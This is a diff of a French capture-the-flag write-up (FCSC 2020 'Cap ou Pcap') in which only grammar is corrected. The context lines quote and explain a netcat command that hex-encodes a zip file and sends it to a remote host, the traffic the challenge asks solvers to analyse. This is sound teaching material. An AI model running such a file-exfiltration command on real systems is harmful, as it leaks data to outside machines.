@@ -4,7 +4,7 @@ Bonjoir à tous. On va regarder au challenge Cap ou Pcap du [FCSC 2020](https://
 
 ![intro](assets/intro.png)
 
-Dans ce challenge on doit trouver le flag dans [ce fichier](ressources/cap.pcap)
+Dans ce challenge, on doit trouver le flag dans [ce fichier](ressources/cap.pcap)
 
 ## Kessessé ?
 
@@ -33,7 +33,7 @@ xxd -p Documents/flag.zip | tr -d '\n' | netcat 172.20.20.133 20200
 [`netcat`](https://www.commandlinux.com/man-page/man1/nc.1.html) est un programme qui transmet de la donnée à une machine distante en TCP.
 
 Donc, ce que veut dire cette commande c'est :
-- Je converti le fichier `Documents/flag.zip` en hexadécimal.
+- Je convertis le fichier `Documents/flag.zip` en hexadécimal.
 - Je dégage les retours à la ligne (`\n`)
 - J'envoie le tout à la machine 172.20.20.133 sur le port 20200
 
@@ -45,7 +45,7 @@ Une trame qui contient pas mal de données. Fort probable que ce soit le fameux 
 
 ## Extraction
 
-Du coup on va extraire ces données comme ceci
+Du coup, on va extraire ces données comme ceci
 
 ![image4](assets/image4.png)
 
